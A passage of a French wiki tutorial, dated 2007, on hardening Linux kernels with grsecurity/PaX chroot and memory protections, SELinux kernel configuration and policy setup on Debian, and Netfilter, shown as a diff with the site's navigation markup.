+<li> Pas d'appel à la fonction «&#160;pivot&#160;» à l'intérieur d'un chroot (méthode d'évasion connue).</li>
+<li> Impossibilité de faire des doubles chroots (méthode d'évasion connue).</li>
+<li> Pas de fchdir en dehors d'un chroot</li>
+<li> Renforcement de l'appel à chdir("/") dans un chroot</li>
+<li> Impossibilité de suider (chmod +s) des binaires à l'intérieur d'un chroot.</li>
+<li> Impossibilité de créer des fichiers spéciaux à l'aide de mknod à l'intérieur d'un chroot.</li>
+<li> Pas d'écriture sysctl à l'intérieur d'un chroot.</li>
+<li> Impossibilité de changer les priorités de l'ordonnanceur à l'intérieur d'un chroot (nice).</li>
+<li> Impossibilité de se connecter aux sockets abstraites UNIX situées en dehors d'un chroot.</li>
+<li> Logs des exécutions à l'intérieur d'un chroot.</li></ul>
+<p><br />
+L'outil gradm (disponible sur le site de grsecurity) et paxctl (disponible sur le site de PaX) permettent d'alléger ou d'augmenter les restrictions GrSecurity/PaX sur les binaires, et ce de façon unitaire. Il est alors possible d'exclure par exemple des binaires sur les protections en vigueur sur le système.
+</p><p>L'installation est très simple et rapide. Il suffit de récupérer le dernier patch en date sur le site de GrSecurity et de l'installer&#160;:
+</p>
+<div dir="ltr" class="mw-geshi mw-code mw-content-ltr"><div class="text source-text"><pre class="de1">gunzip grsecurity-2.1.8-2.6.14.6-200601211647.patch.gz
+cp grsecurity-2.1.8-2.6.14.6-200601211647.patch linux
+cd linux
+patch -p1 &lt; grsecurity-2.1.8-2.6.14.6-200601211647.patch
+patching file security/security.c
+(...)</pre></div></div>
+<p>La configuration s'effectue ensuite de façon classique avec un make menuconfig par exemple.
+</p><p>GrSecurity et Pax sont placés dans le menu «&#160;Security options&#160;», tout comme SELinux, au même titre que les autres moyens de protection bas niveau&#160;:
+</p>
+<div dir="ltr" class="mw-geshi mw-code mw-content-ltr"><div class="text source-text"><pre class="de1">Linux Kernel v2.6.16.9 Configuration
+Linux Kernel Configuration
+x x Code maturity level options ---&gt;
+x x General setup ---&gt;
+x x Loadable module support ---&gt;
+x x Block layer ---&gt;
+x x Processor type and features ---&gt;
+x x Power management options (ACPI, APM) ---&gt;
+x x Bus options (PCI, PCMCIA, EISA, MCA, ISA) ---&gt;
+x x Executable file formats ---&gt;
+x x Networking ---&gt;
+x x Device Drivers ---&gt;
+x x File systems ---&gt;
+x x Instrumentation Support ---&gt;
+x x Kernel hacking ---&gt;
+x x Security options ---&gt;
+x x Cryptographic options ---&gt;
+x x Library routines ---&gt;
+x x ---
+x x Load an Alternate Configuration File
+x x Save Configuration to an Alternate File</pre></div></div>
+<p>Dans le menu «&#160;Security options&#160;», PaX et GrSecurity sont dissociés. Cependant GrSecurity propose également des fonctionnalités relatives à la gestion de la mémoire&#160;:
+</p>
+<div dir="ltr" class="mw-geshi mw-code mw-content-ltr"><div class="text source-text"><pre class="de1">PaX ---&gt;
+Grsecurity ---&gt;
+[*] Enable access key retention support
+[*] Enable the /proc/keys file by which all keys may be viewed
+[*] Enable different security models
+[*] Socket and Networking Security Hooks
+&lt;*&gt; Default Linux Capabilities
+&lt; &gt; Root Plug Support
+&lt;*&gt; BSD Secure Levels</pre></div></div>
+<p>Pour Pax, les sous-menus permettent de configurer finement la protection mémoire&#160;:
+</p>
+<div dir="ltr" class="mw-geshi mw-code mw-content-ltr"><div class="text source-text"><pre class="de1">[*] Enable various PaX features
+PaX Control ---&gt; Non-executable pages ---&gt; Address Space Layout Randomization ---&gt;</pre></div></div>
+<p>La configuration de GrSecurity s'effectue sur le même modèle&#160;:
+</p>
+<div dir="ltr" class="mw-geshi mw-code mw-content-ltr"><div class="text source-text"><pre class="de1">[*] Grsecurity
+Security Level (Custom) ---&gt;
+Address Space Protection ---&gt;
+Role Based Access Control Options ---&gt;
+Filesystem Protections ---&gt;
+Kernel Auditing ---&gt;
+Executable Protections ---&gt;
+Network Protections ---&gt;
+Sysctl support ---&gt;
+Logging Options ---&gt;</pre></div></div>
+<p>Détailler toutes les options de GrSecurity serait beaucoup trop long (la documentation officielle elle-même passe rapidement sur ces fonctionnalités). Pour chaque fonction proposée, une aide détaillée en anglais permet de comprendre les rôles précis. Pour y accéder, vous devrez vous placer sur la fonction dont vous souhaitez obtenir l'aide, puis presser la touche «&#160;?&#160;».
+</p><p>Attention cependant à l'option «&#160;Runtime module disabling&#160;», déconseillée la plupart du temps, sauf si vous désirez interdire ou restreindre de façon drastique l'utilisation des modules (LKM&#160;: Linux Kernel Module).
+</p><p>La fonction «&#160;sysctl enable&#160;» est également déconseillée car elle permet de «&#160;bypasser&#160;» aisément GrSecurity si le verrou sysctl n'est pas placé correctement. Ne l'activez donc pas si vous n'en connaissez pas exactement le rôle.
+</p><p>L'approche «&#160;W^X&#160;» (à lire «&#160;Write XOR eXecute&#160;») permet de ne pas activer une section mémoire en écriture et en exécution simultanément. De fait, un shellcode placé par un utilisateur ne pourra pas y être exécuté. Il existe cependant encore des moyens de contourner cette dernière technique... Comme toujours&#160;!
+</p>
+<h1><span class="mw-headline" id="SELinux"><span class="mw-headline-number">5</span> SELinux</span></h1>
+<h2><span class="mw-headline" id="Partie_1"><span class="mw-headline-number">5.1</span> Partie 1</span></h2>
+<p>SELinux apporte aux noyaux des systèmes d'exploitation GNU/Linux ses nombreuses et riches fonctionnalités afin notamment de reistreindre l'environnement dans lequel un attaquant pourrait profiter d'une exploitation réussi. Cette première partie concerne la présentation de ces fonctionnalités et l'installation de SELinux.
+</p><p>Suite à de longs et virulents débats entre les mainteneurs du noyau Linux, mais également entre les utilisateurs finaux, SELinux a finalement été adoptée comme solution de sécurité par défaut lors du passage aux versions du noyau 2.6.X. La précédente branche stable du noyau (2.4.X) ne proposait, de base, aucune solution de ce type; ce besoin était pourtant vivement exprimé depuis plusieurs années déjà.
+</p><p>Le choix de SELinux a notamment été motivé par les garanties que ce projet pouvait apporter en termes de maintenance, d'évolutivité, mais également de moyens. Les services américains de la NSA ont su (l'histoire ne dira sans doute jamais si une totale transparence était de mise ou non), semble t-il, se démarquer, auprès de Linus Torvald pour faire adopter leur solution.
+</p><p>Quoi qu'il en soit, la qualité du code de SELinux, la richesse de ses fonctionnalités en font une solution très «&#160;recommandable&#160;» pour les renforcements sur les serveurs de production nécessitant toujours plus de robustesse, sécurité, et accessibilité.
+</p><p>L'approche des renforcements de SELinux se base donc, comme nous l'avons présenté en introduction, sur les moyens de restreindre au maximum l'environnement d'un attaquant ayant compromis partiellement (droits «&#160;user&#160;») ou totalement (droits «&#160;root&#160;») le système d'information. L'utilisateur root (souvent appelé «&#160;superuser&#160;» du fait de ses droits illimités sur un système Linux standard) est alors lui-même restreint.
+</p><p>De fait, la compromission d'un serveur implémentant SELinux peut alors être réduite aux seuls dégâts locaux de l'application vulnérable incriminée (ce n'est d'ailleurs pas toujours vrai!).
+</p><p>Le type «&#160;classique&#160;» de gestion des contrôles d'accès est du type DAC (Discretionary Access Control). Celui retenu par SELinux se rapproche très fortement du MAC (Mandatory Access Control) avec cependant quelques adaptations.
+</p><p>Il porte le nom de Flask et se différencie des MAC du type MLS (Multi-Level Security) qui n'intègrent pas&#160;:
+</p>
+<ul><li> de contrôle sur l'intégrité des données&#160;;</li>
+<li> le principe du «&#160;moindre privilège&#160;» (least privilege)&#160;;</li>
+<li> la séparation des processus et des objets au sens ACL (Access Control List) du terme.</li></ul>
+<p>Les MLS se contentent d'assurer la confidentialité des fichiers et de certaines données en fonction des utilisateurs ou des appels qui l'initient.
+</p><p>Flask permet donc de palier ces différents problèmes en proposant les contre-mesures adaptées et en ajoutant des protections sur&#160;:
+</p>
+<ul><li> Les fichiers</li>
+<li> Les processus</li>
+<li> Les signaux, et appels de type ptrace</li>
+<li> Les sockets et flux réseaux</li>
+<li> La gestion de l'interfaçage kernel land via un contrôle sur les modules, les appels systèmes et autres biais permettant d'atteindre le noyau du système.</li>
+<li> Mais également sur les fonctionnements internes des programmes grâce à une API permettant d'utiliser les fonctionnalités de SELinux directement.</li></ul>
+<p>Au niveau des options à configurer dans le noyau, SELinux comporte de multiples dépendances qu'il faudra impérativement «&#160;résoudre&#160;» avant de pouvoir ajouter le support. Selon le système de fichiers utilisé, retenez les entrées nécessaires dans la section «&#160;File systems&#160;» de votre configuration.
+</p><p>Un simple make menuconfig vous permettra de définir les options que vous voulez utiliser.
+</p><p>Voici les options nécessaires à son bon fonctionnement&#160;:
+</p>
+<div dir="ltr" class="mw-geshi mw-code mw-content-ltr"><div class="text source-text"><pre class="de1">&quot;Code maturity level options&quot;
+[*] Prompt for development and/or incomplete code/drivers
+&#160;
+&quot;General setup&quot;
+[*] Auditing support
+&#160;
+&quot;File systems&quot;
+&lt;*&gt; Second extended fs support
+[*] Ext2 extended attributes
+[ ] Ext2 POSIX Access Control Lists
+[*] Ext2 Security Labels
+&lt;*&gt; Ext3 journalling file system support
+[*] Ext3 extended attributes
+[ ] Ext3 POSIX Access Control Lists
+[*] Ext3 security labels
+&lt;*&gt; JFS filesystem support
+[ ] JFS POSIX Access Control Lists
+[*] JFS Security Labels
+[ ] JFS debugging
+[ ] JFS statistics
+&lt;*&gt; XFS filesystem support
+[ ] Realtime support (EXPERIMENTAL)
+[ ] Quota support
+[ ] ACL support
+[*] Security Labels
+&#160;
+[*] /proc file system support
+[ ] /dev file system support (EXPERIMENTAL)
+[*] /dev/pts file system for Unix98 PTYs
+[*] /dev/pts Extended Attributes
+[*] /dev/pts Security Labels
+[*] Virtual memory file system support
+[*] tmpfs Extended Attributes
+[*] tmpfs Security Labels
+&#160;
+&quot;Security options&quot;
+[*] Enable different security models
+[*] Socket and Networking Security Hooks
+&lt;*&gt; Capabilities Support
+[*] NSA SELinux Support
+[*] NSA SELinux boot parameter
+[*] NSA SELinux runtime disable
+[*] NSA SELinux Development Support
+[*] NSA SELinux AVC Statistics
+[*] NSA SELinux MLS policy (EXPERIMENTAL)</pre></div></div>
+<p>Attention&#160;: pensez à ne laisser que le strict minimum, notamment s'il s'agit d'un serveur de production. Inutile donc de compiler le support pour une carte Tuner, l'accélération matérielle 3D, etc.
+</p><p>Une fois le noyau entièrement configuré (cette phase est souvent bien plus longue que la phase de compilation qui suit), les étapes classiques suivent&#160;:
+</p>
+<div dir="ltr" class="mw-geshi mw-code mw-content-ltr"><div class="text source-text"><pre class="de1">make
+make modules
+make modules_install
+cp arch/i386/bzImage /boot/vmlinux-2.6.16
+cp System.map /boot/System.map-2.6.16
+cp .config /boot/config-2.6.16</pre></div></div>
+<p>Puis si vous utilisez grub (ici avec un disque ide), ajoutez dans le fichier /boot/grub/menu.lst des lignes suivantes avec les informations de disques et de partitions concernant votre machine&#160;:
+</p>
+<div dir="ltr" class="mw-geshi mw-code mw-content-ltr"><div class="text source-text"><pre class="de1">title Linux-2.6.16
+root (hd0,3) # A adapter selon votre configuration
+kernel /boot/vmlinuz-2.6.16 root=/dev/hda4
+# Adaptez root selon votre configuration</pre></div></div>
+<p>Ou lilo (/etc/lilo.conf)&#160;:
+</p>
+<div dir="ltr" class="mw-geshi mw-code mw-content-ltr"><div class="text source-text"><pre class="de1">image=/boot/vmlinuz-2.6.16
+label=linux
+read-only
+root=/dev/hda4</pre></div></div>
+<p>Le répertoire /selinux doit ensuite être crée afin d'y stocker les futurs fichiers de policies (règles MAC SELinux)&#160;:
+</p>
+<div dir="ltr" class="mw-geshi mw-code mw-content-ltr"><div class="text source-text"><pre class="de1">mkdir /selinux
+&#160;
+chmod 700 /selinux</pre></div></div>
+<p>Le fichier /etc/fstab, contenant les points de montages virtuels et physiques de la machine, doit être complété afin d'y faire figurer le dernier montage relatif à SELinux&#160;:
+</p>
+<pre>none /selinux selinuxfs defaults 0 0
+</pre>
+<p><br />
+Le noyau et le système sont configurés pour utiliser SELinux. Un simple redémarrage, en sélectionnant le nouveau noyau généré est nécessaire pour poursuivre le déploiement.
+</p>
+<h2><span class="mw-headline" id="Partie_2"><span class="mw-headline-number">5.2</span> Partie 2</span></h2>
+<p>Retrouvez, dans cette seconde partie consacrée à SELinux, les détails relatifs à la configuration des rêgles de sécurité SELinux ainsi que la présentation de différents outils et rêgles pré-établies dans le but de faciliter la sécurisation d'un système de manière maximale.
+</p><p>Comme tous les systèmes basés sur les ACL (Access Control List), la configuration des règles est sans aucun doute la phase la plus délicate car l'oubli d'une seule règle est bien souvent synonyme de dysfonctionnement ou tout simplement de crash (accès impossible à un fichier, flux réseau filtré, etc.).
+</p><p>Nous ne détaillerons pas «&#160;point par point&#160;» la configuration des règles SELinux, étant donnée la multitude d'usages différents que peut avoir un serveur. En revanche, nous allons présenter la méthode permettant de définir, puis d'affiner les règles afin d'obtenir un système le plus restrictif possible (ce qui est l'objet de cette protection, rappelons-le), mais fonctionnel tout de même...
+</p><p>Il est assez peu envisageable (ou alors avec un budget en conséquence&#160;!) de redéfinir les règles pour chaque processus du système. Plusieurs approches sont alors possibles&#160;: utiliser des outils permettant «&#160;d'apprendre&#160;» le comportement du système (fichiers et ressources accédés, etc.) et d'en tirer une première configuration basique. La deuxième approche, plus fine, est d'utiliser les règles proposées par la distribution. La majeure partie des distributions propose ce type de règles.
+</p><p>Attardons-nous désormais sur l'approche de la distribution Debian, avec son package selinux-policy-default. Lors de l'installation, apt-get pose de très nombreuses questions sur l'usage du serveur qui en sera fait. Les usages les plus courants (serveur graphique, serveur de mail, serveur apache, etc.) sont alors proposés, et il suffit simplement de répondre aux questions posées afin de générer les règles appropriées&#160;:
+</p>
+<div dir="ltr" class="mw-geshi mw-code mw-content-ltr"><div class="text source-text"><pre class="de1">(...)
+Do you want domains/program/ircd.te:Ircd - IRC server
+Yes/No/Display [Y/n/d]?
+Do you want domains/program/distcc.te:distcc - Distributed compiler daemon
+Yes/No/Display [Y/n/d]?
+Do you want domains/program/gnome-pty-helper.te:Gnome Terminal - Helper program for GNOME x-terms
+Yes/No/Display [Y/n/d]?
+Do you want domains/program/uwimapd.te:uw-imapd-ssl server
+Yes/No/Display [Y/n/d]?
+Do you want domains/program/apache.te:Apache - Web server
+Yes/No/Display [Y/n/d]?
+Do you want domains/program/klogd.te:Klogd - Kernel log daemon
+Yes/No/Display [Y/n/d]?
+(...)</pre></div></div>
+<p>Une fois toutes ces règles par défauts définies, il convient d'affiner la protection en les re vérifiant et en les adaptant à l'usage exact qui va en être fait. Elles sont contenues dans /etc/selinux puis transférées dans leurs versions binaires dans le répertoire /selinux.
+</p>
+<div dir="ltr" class="mw-geshi mw-code mw-content-ltr"><div class="text source-text"><pre class="de1">cd /etc/selinux/(strict|targeted)/src/policy
+&#160;
+make relabel</pre></div></div>
+<p>De nombreuses ressources sur la configuration d'outils, de serveurs sont disponibles. D'autres policies sont également disponibles ailleurs.
+</p><p>Les patches les plus critiques quant à la sécurité du système sont ceux de init (sysvinit-selinux.patch sous Debian), pam (pam-selinux.patch sous Debian), sshd (openssh-selinux.patch sous Debian) et crond (vixie-cron-selinux.patch sous Debian).
+</p><p>Ces patches chargent la policy et initialisent les contextes de sécurité de l'utilisateur. Il faut également modifier la configuration de pam pour login (fichier /etc/pam.d/login)&#160;:
+</p>
+<pre>session required pam_selinux.so multiple 
+</pre>
+<p>L'outil checkpolicy permet de compiler les sources des policies afin de les traduire en «&#160;binaires&#160;» reconnus par SELinux. Il est donc nécessaire de lancer cet outil sur les policies créées avant de les importer.
+</p><p>L'outil refpolicy permet, quant à lui, de créer des policies SELinux complètes comme alternatives aux policies strictes disponibles sur les distributions classiques. Il s'agit d'un outil encore en phase de développement, soutenu par l'équipe de «&#160;Tresys Technology&#160;». De nombreux contributeurs publient les policies qu'ils ont créées, mettant ainsi à disposition du public un large choix de fichiers. Le page «&#160;getting started&#160;» du site suivant permet également de se familiariser avec l'écriture de ces fichiers.
+</p><p>A retenir qu'au niveau des policies, les «&#160;rôles&#160;» suivants sont destinés à des utilisateurs ayant un besoin de capabilities supplémentaires sur le système&#160;:
+</p>
+<ul><li> staff_r</li>
+<li> sysadm_r</li>
+<li> system_r</li></ul>
+<p><br />
+Tandis que le rôle user_r est destiné aux utilisateurs normaux, ne requérant aucun privilège particulier.
+</p><p>Il est recommandé, en fonction de la distribution Linux retenue, d'installer les packages relatifs à SELinux. Si vous utilisez la distribution Debian par exemple, les paquets suivants sont plus que conseillés pour un fonctionnement optimal&#160;:
+</p>
+<div dir="ltr" class="mw-geshi mw-code mw-content-ltr"><div class="text source-text"><pre class="de1">checkpolicy - SELinux policy compiler
+libselinux1 - SELinux shared libraries
+libselinux1-dev - SELinux development headers
+libsemanage1 - shared libraries used by SELinux policy manipulation tools
+libsemanage1-dev - Header files and libraries for SELinux policy manipulation tools
+libsepol1 - Security Enhanced Linux policy library for changing policy binaries
+polgen - SELinux policy generation scripts
+policycoreutils - SELinux core policy utilities
+python2.4-selinux - Python2.4 bindings to SELinux shared libraries
+python2.4-semanage - Python2.4 bindings for SELinux policy manipulation tools
+selinux-basics - SELinux basic support
+selinux-doc - documentation for Security-Enhanced Linux
+selinux-policy-default - Policy config files and management for NSA Security Enhanced Linux
+selinux-utils - SELinux utility programs
+slat - Tools for information flow analysis of SELinux policies
+polgen-doc - Documentation for SELinux policy generation scripts</pre></div></div>
+<p>Ces paquets vont s'occuper de la partie userland de SELinux, à savoir l'installation de certains patches (notamment sur la libc pour rendre supportable certains hooks propres à SELinux), l'adaptation des fichiers sensibles du système (/etc/passwd, /etc/shadow), afin d'empêcher le super-utilisateur root de les modifier.
+</p><p>Les binaires id et ls (ps -eZ) permettent alors d'afficher les contextes de sécurité et les attributs étendus sur le système de fichiers
+</p><p>En toute fin de configuration, après de multiples tests, l'option enforcing=1 doit être ajoutée dans les options de boot du chargeur au démarrage (lilo ou grub) pour rendre SELinux effectif dès le chargement.
+</p>
+<h1><span class="mw-headline" id="Netfilter.2C_conclusions_.26_webographie"><span class="mw-headline-number">6</span> Netfilter, conclusions &amp; webographie</span></h1>
+<p>La puissance de configuration des rêgles de filtrage avec Netfilter sous les systèmes d'exploitation GNU/Linux n'est plus à prouver mais peu finalement connaissent l'ensemble des fonctionnalités disponibles avec cet outil. Retrouvez également les conclusions de ce dossier sur le renforcement de la sécurité des noyaux Linux ainsi que l'ensemble des adresses de sites web citées.
+</p><p>Les fonctionnalités liées à la sécurité du filtrage, que ce soit au niveau 2 (filtrage MAC/Bridge, ebtables, etc.), ou au niveau 3 (Netfilter et son «&#160;appelant&#160;» en userland iptables) sont intégrées dans le noyau. La puissance des modifications envisageables est énorme, et il est possible, moyennant temps et expertise, de transformer un serveur Linux en robuste équipement réseau pouvant supporter des charges très importantes.
+</p><p>Netfilter permet, de base, d'effectuer de nombreux traitements sur les paquets qui transitent (chaînes INPUT, OUTPUT, et FORWARD) mais également des modifications (table mangle).
+</p><p>De nouvelles fonctions sont disponibles grâce au paquet patch-o-matic qui permet de rajouter plusieurs fonctions avancées (traitement par UID/GID, pattern-matching, règles réagissant sur des contraintes horaires, etc.).
+</p><p>Nous ne rentrerons pas dans les détails propres à de telles configurations, qui pourraient, à elles seules, faire l'objet de nombreux articles. Le lecteur pourra se référer aux nombreuses ressources disponibles sur Internet.
+</p><p>A noter également l'intégration par défaut d'IPSEC dans les noyaux 2.6.x qui permet de monter des réseaux sécurisés, sur IP, à moindre coût, sans forcément déployer l'arsenal d'IPv6.
+</p><p><br />
+Les protections au niveau du noyau Linux, comme nous l'avons vu, permettent de renforcer de façon significative la sécurité globale du système. Elles permettront de réduire à néant les exploitations massives du type script kiddies ou vers (worms). Un attaquant très expérimenté, lors d'une attaque ciblée, pourrait cependant éventuellement trouver le moyen de contourner certaines protections (cf. chapitre sur le contournement d'ASLR).
+</p><p>Le risque zéro en sécurité, nous le savons bien, n'existe pas et les moyens de protection sont souvent maltraités par les chercheurs puis rendus obsolètes après quelques années seulement.
+</p><p>Un serveur Linux placé sur une zone considérée comme non sure (Internet en fait partie évidemment) devrait systématiquement intégrer l'un de ces renforcements noyau. Il est possible, en combinant ces protections, avec une politique de sécurité correctement définie (politique de mots de passe, de mises à jour, etc.) d'atteindre une limite très poussée.
+</p><p>Le dernier facteur, et non le moins important, devient alors «&#160;humain&#160;»&#160;: social engineering, fuites d'informations, et bien évidemment moyens de protections physiques... Mais avant d'en arriver à ce niveau de sécurisation, il reste un grand travail à effectuer sur les moyens de protections logiques&#160;!
+</p><p>A noter que certaines distributions spécialisées sont tournées vers ces «&#160;hauts niveaux de sécurité&#160;». L'une des plus connues il a quelques temps étant Adamantix, sur une base de Debian, qui n'est plus maintenue à l'heure actuelle ... Avis aux amateurs&#160;! 
+</p>
+<h1><span class="mw-headline" id="Ressources"><span class="mw-headline-number">7</span> Ressources</span></h1>
+<p><a rel="nofollow" class="external text" href="http://www.secuobs.com/news/14112007-kernel_hardening.shtml">Article SecuObs</a><br />
+<a href="Sécurisation_de_son_noyau_avec_Grsecurity_et_PaX.html" title="Sécurisation de son noyau avec Grsecurity et PaX">Sécurisation de son noyau avec Grsecurity et PaX</a>
+</p>
+<!-- 
+NewPP limit report
+CPU time usage: 0.028 seconds
+Real time usage: 0.028 seconds
+Preprocessor visited node count: 232/1000000
+Preprocessor generated node count: 480/1000000
+Post‐expand include size: 0/2097152 bytes
+Template argument size: 0/2097152 bytes
+Highest expansion depth: 2/40
+Expensive parser function count: 0/100
+-->
+
+<!-- 
+Transclusion expansion time report (%,ms,calls,template)
+100.00%    0.000      1 - -total
+-->
+
+<!-- Saved in parser cache with key blocnotesinfo-wiki_:pcache:idhash:2326-0!*!0!1!en!*!* and timestamp 20181111230722 and revision id 5097
+ -->
+</div>									<div class="printfooter">
+						Retrieved from "<a dir="ltr" href="https://wiki.deimos.fr/index.php?title=Renforcement_des_fonctions_de_sécurité_du_noyau_Linux&amp;oldid=5097">https://wiki.deimos.fr/index.php?title=Renforcement_des_fonctions_de_sécurité_du_noyau_Linux&amp;oldid=5097</a>"					</div>
+													<div id='catlinks' class='catlinks catlinks-allhidden'></div>												<div class="visualClear"></div>
+							</div>
+		</div>
+		<div id="mw-navigation">
+			<h2>Navigation menu</h2>
+
+			<div id="mw-head">
+									<div id="p-personal" role="navigation" class="" aria-labelledby="p-personal-label">
+						<h3 id="p-personal-label">Personal tools</h3>
+						<ul>
+							<li id="pt-login"><a href="https://wiki.deimos.fr/index.php?title=Special:UserLogin&amp;returnto=Renforcement+des+fonctions+de+s%C3%A9curit%C3%A9+du+noyau+Linux" title="You are encouraged to log in; however, it is not mandatory [o]" accesskey="o">Log in</a></li>						</ul>
+					</div>
+									<div id="left-navigation">
+										<div id="p-namespaces" role="navigation" class="vectorTabs" aria-labelledby="p-namespaces-label">
+						<h3 id="p-namespaces-label">Namespaces</h3>
+						<ul>
+															<li  id="ca-nstab-main" class="selected"><span><a href="Renforcement_des_fonctions_de_sécurité_du_noyau_Linux.html"  title="View the content page [c]" accesskey="c">Page</a></span></li>
+													</ul>
+					</div>
+										<div id="p-variants" role="navigation" class="vectorMenu emptyPortlet" aria-labelledby="p-variants-label">
+												<h3 id="p-variants-label"><span>Variants</span><a href="Renforcement_des_fonctions_de_sécurité_du_noyau_Linux.html#"></a></h3>
+
+						<div class="menu">
+							<ul>
+															</ul>
+						</div>
+					</div>
+									</div>
+				<div id="right-navigation">
+										<div id="p-views" role="navigation" class="vectorTabs" aria-labelledby="p-views-label">
+						<h3 id="p-views-label">Views</h3>
+						<ul>
+															<li id="ca-view" class="selected"><span><a href="Renforcement_des_fonctions_de_sécurité_du_noyau_Linux.html" >Read</a></span></li>
+															<li id="ca-viewsource"><span><a href="https://wiki.deimos.fr/index.php?title=Renforcement_des_fonctions_de_s%C3%A9curit%C3%A9_du_noyau_Linux&amp;action=edit"  title="This page is protected.&#10;You can view its source [e]" accesskey="e">View source</a></span></li>
+															<li id="ca-history" class="collapsible"><span><a href="https://wiki.deimos.fr/index.php?title=Renforcement_des_fonctions_de_s%C3%A9curit%C3%A9_du_noyau_Linux&amp;action=history"  title="Past revisions of this page [h]" accesskey="h">View history</a></span></li>
+													</ul>
+					</div>
+										<div id="p-cactions" role="navigation" class="vectorMenu emptyPortlet" aria-labelledby="p-cactions-label">
+						<h3 id="p-cactions-label"><span>More</span><a href="Renforcement_des_fonctions_de_sécurité_du_noyau_Linux.html#"></a></h3>
+
+						<div class="menu">
+							<ul>
+															</ul>
+						</div>
+					</div>
+										<div id="p-search" role="search">
+						<h3>
+							<label for="searchInput">Search</label>
+						</h3>
+
+						<form action="https://wiki.deimos.fr/index.php" id="searchform">
+														<div id="simpleSearch">
+															<input type="search" name="search" placeholder="Search" title="Search Deimos.fr / Bloc Notes Informatique [f]" accesskey="f" id="searchInput" /><input type="hidden" value="Special:Search" name="title" /><input type="submit" name="fulltext" value="Search" title="Search the pages for this text" id="mw-searchButton" class="searchButton mw-fallbackSearchButton" /><input type="submit" name="go" value="Go" title="Go to a page with this exact name if exists" id="searchButton" class="searchButton" />								</div>
+						</form>
+					</div>
+									</div>
+			</div>
+			<div id="mw-panel">
+				<div id="p-logo" role="banner"><a style="background-image: url(images/a/a7/Logo_deimosfr.png);" href="index.html"  title="Visit the main page"></a></div>
+						<div class="portal" role="navigation" id='p-navigation_et_RSS' aria-labelledby='p-navigation_et_RSS-label'>
+			<h3 id='p-navigation_et_RSS-label'>navigation et RSS</h3>
+
+			<div class="body">
+									<ul>
+													<li id="n-cd-.7E"><a href="index.html">cd ~</a></li>
+											</ul>
+							</div>
+		</div>
+			<div class="portal" role="navigation" id='p-Menu' aria-labelledby='p-Menu-label'>
+			<h3 id='p-Menu-label'>Menu</h3>
+
+			<div class="body">
+									<ul>
+													<li id="n-Solaris"><a href="Solaris.html">Solaris</a></li>
+													<li id="n-BSD"><a href="BSD.html">BSD</a></li>
+													<li id="n-Linux"><a href="Linux.html">Linux</a></li>
+													<li id="n-Mac-OS-X"><a href="Mac_OS_X.html">Mac OS X</a></li>
+													<li id="n-Windows"><a href="Windows.html">Windows</a></li>
+													<li id="n-Servers"><a href="Serveurs.html">Servers</a></li>
+													<li id="n-Development"><a href="Développement.html">Development</a></li>
+													<li id="n-Ethical-Hacking"><a href="Hacking_éthique.html">Ethical Hacking</a></li>
+													<li id="n-Network"><a href="Réseaux.html">Network</a></li>
+													<li id="n-Divers"><a href="Divers.html">Divers</a></li>
+											</ul>
+							</div>
+		</div>
+			<div class="portal" role="navigation" id='p-Liens' aria-labelledby='p-Liens-label'>
+			<h3 id='p-Liens-label'>Liens</h3>
+
+			<div class="body">
+									<ul>
+													<li id="n-Welcome-Page"><a href="http://www.deimos.fr" rel="nofollow">Welcome Page</a></li>
+													<li id="n-Blog"><a href="http://blog.deimos.fr" rel="nofollow">Blog</a></li>
+													<li id="n-Resume"><a href="https://www.linkedin.com/in/pmavro/" rel="nofollow">Resume</a></li>
+													<li id="n-GitHub"><a href="https://github.com/deimosfr" rel="nofollow">GitHub</a></li>
+											</ul>
+							</div>
+		</div>
+			<div class="portal" role="navigation" id='p-Google_Search' aria-labelledby='p-Google_Search-label'>
+			<h3 id='p-Google_Search-label'>Google Search</h3>
+
+			<div class="body">
+									
+<div><form action="http://www.google.fr/cse" id="cse-search-box">
+    <input type="hidden" name="cx" value="partner-pub-8001790276473966:7664586454" />
+    <input type="hidden" name="ie" value="UTF-8" />
+    <input type="text" name="q" size="12" />
+    <input type="submit" name="sa" value="Search" />
+</form></div>			</div>
+		</div>
+			<div class="portal" role="navigation" id='p-googletranslator' aria-labelledby='p-googletranslator-label'>
+			<h3 id='p-googletranslator-label'>Translate</h3>
+
+			<div class="body">
+									<div id="google_translate_element"></div><script>
+                                        function googleTranslateElementInit() {
+                                          new google.translate.TranslateElement({
+                                            pageLanguage: 'fr',
+                                            includedLanguages: 'en,de,es'
+                                          }, 'google_translate_element');
+                                        }
+                                        </script><script src="http://translate.google.com/translate_a/element.js?cb=googleTranslateElementInit"></script>			</div>
+		</div>
+			<div class="portal" role="navigation" id='p-tb' aria-labelledby='p-tb-label'>
+			<h3 id='p-tb-label'>Tools</h3>
+
+			<div class="body">
+									<ul>
+													<li id="t-whatlinkshere"><a href="./Special:WhatLinksHere/Renforcement_des_fonctions_de_sécurité_du_noyau_Linux.html" title="A list of all wiki pages that link here [j]" accesskey="j">What links here</a></li>
+													<li id="t-recentchangeslinked"><a href="https://wiki.deimos.fr/Special:RecentChangesLinked/Renforcement_des_fonctions_de_s%C3%A9curit%C3%A9_du_noyau_Linux" title="Recent changes in pages linked from this page [k]" accesskey="k">Related changes</a></li>
+													<li id="t-specialpages"><a href="https://wiki.deimos.fr/Special:SpecialPages" title="A list of all special pages [q]" accesskey="q">Special pages</a></li>
+													<li id="t-print"><a href="https://wiki.deimos.fr/index.php?title=Renforcement_des_fonctions_de_s%C3%A9curit%C3%A9_du_noyau_Linux&amp;printable=yes" rel="alternate" title="Printable version of this page [p]" accesskey="p">Printable version</a></li>
+													<li id="t-permalink"><a href="https://wiki.deimos.fr/index.php?title=Renforcement_des_fonctions_de_s%C3%A9curit%C3%A9_du_noyau_Linux&amp;oldid=5097" title="Permanent link to this revision of the page">Permanent link</a></li>
+													<li id="t-info"><a href="https://wiki.deimos.fr/index.php?title=Renforcement_des_fonctions_de_s%C3%A9curit%C3%A9_du_noyau_Linux&amp;action=info" title="More information about this page">Page information</a></li>
+											</ul>
+							</div>
+		</div>
+				</div>
+		</div>
+		<div id="footer" role="contentinfo">
+							<ul id="footer-info">
+											<li id="footer-info-lastmod"> This page was last modified on 15 November 2007, at 21:30.</li>
+											<li id="footer-info-copyright">Content is available under <a class="external" rel="nofollow" href="http://creativecommons.org/licenses/by-nc-sa/3.0/deed.fr">Attribution - Pas d’Utilisation Commerciale - Partage dans les Mêmes Conditions 3.0 non transposé</a> unless otherwise noted.</li>
+									</ul>
+							<ul id="footer-places">
